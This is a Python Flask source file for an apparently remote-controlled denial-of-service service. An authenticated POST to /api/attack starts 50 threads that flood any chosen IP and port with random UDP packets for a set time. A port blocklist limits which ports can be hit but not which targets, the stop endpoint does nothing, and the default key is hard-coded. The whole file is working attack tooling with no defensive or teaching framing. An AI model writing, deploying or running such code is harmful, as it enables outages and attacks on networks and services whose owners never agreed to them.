from flask import Flask, request, jsonify
import threading, time, socket, random, os

app = Flask(__name__)
API_KEY = os.environ.get("API_KEY", "test123")

BLOCKED_PORTS = [1, 3, 6, 9, 13, 17, 19, 21, 22, 23, 26, 27, 30, 31, 36, 37, 38, 41, 42, 43, 49, 51, 53, 55, 58, 59, 67, 68, 69, 77, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 113, 115, 117, 119, 123, 135, 137, 139, 143, 161, 179, 389, 443, 445, 465, 500, 513, 514, 515, 520, 521, 540, 548, 554, 546, 547, 560, 563, 587, 591, 593, 636, 639, 646, 647, 648, 666, 808, 873, 990, 993, 995, 1025, 1026, 1027, 1028, 1029, 1030, 1031, 1032, 1033, 1034, 1035, 1036, 1037, 1038, 1039, 1040, 1041, 1042, 1043, 1044, 1045, 1046, 1047, 1048, 1049, 1050, 1051, 1052, 1053, 1054, 1055, 1056, 1057, 1058, 1059, 1060, 1061, 1062, 1063, 1064, 1065, 1066, 1067, 1068, 1069, 1070, 1071, 1072, 1073, 1074, 1075, 1076, 1077, 1078, 1079, 1080, 1081, 1082, 1083, 1084, 1085, 1086, 1087, 1088, 1089, 1090, 1091, 1092, 1093, 1094, 1095, 1096, 1097, 1098, 1099, 3306, 3389, 5060, 5061, 5432, 5900, 5901, 5984, 6379, 8080, 8443, 9001, 9090, 10000]

def check_auth(request):
    return request.headers.get("Authorization") == f"Bearer {API_KEY}"

def udp_flood(target_ip, port, duration, stop_event):
    end_time = time.time() + duration
    while time.time() < end_time and not stop_event.is_set():
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            packet = random._urandom(random.randint(64, 1400))
            sock.sendto(packet, (target_ip, port))
            sock.close()
        except:
            pass

@app.route("/api/attack", methods=["POST"])
def attack():
    if not check_auth(request):
        return jsonify({"error": "Unauthorized"}), 401
    data = request.json
    target = data.get("target", "")
    port = int(data.get("port", 80))
    duration = int(data.get("duration", 30))
    if port in BLOCKED_PORTS:
        return jsonify({"error": f"Port {port} is blocked"}), 400
    stop_event = threading.Event()
    threads = []
    for _ in range(50):
        t = threading.Thread(target=udp_flood, args=(target, port, duration, stop_event))
        t.start()
        threads.append(t)
    def stop_after(jthreads, sevent):
        time.sleep(duration)
        sevent.set()
        for jt in jthreads:
            jt.join()
    threading.Thread(target=stop_after, args=(threads, stop_event), daemon=True).start()
    return jsonify({"success": True, "target": target, "port": port, "duration": duration, "method": "UDP_FLOOD"})

@app.route("/api/stop", methods=["POST"])
def stop():
    if not check_auth(request):
        return jsonify({"error": "Unauthorized"}), 401
    return jsonify({"success": True, "message": "Stopped"})

@app.route("/")
def home():
    return jsonify({"status": "running"})

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000)
